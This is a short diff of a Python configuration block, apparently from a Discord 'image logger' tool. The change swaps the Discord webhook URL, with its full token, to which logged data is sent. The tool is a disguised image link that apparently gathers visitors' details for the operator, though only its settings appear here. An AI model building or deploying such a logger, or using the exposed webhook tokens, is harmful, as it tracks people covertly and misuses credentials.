@@ -12,7 +12,7 @@ __author__ = "thVind"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
+    "webhook": "https://discordapp.com/api/webhooks/1442342461694541936/UMFj8lToq5onM8To52yyD0m1qmVWcKP_2X82gW-NXVaokyMpNsvHTYmbHNWLf7_VeUJn",
     "image": "https://pngtree.com/free-cool-background", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
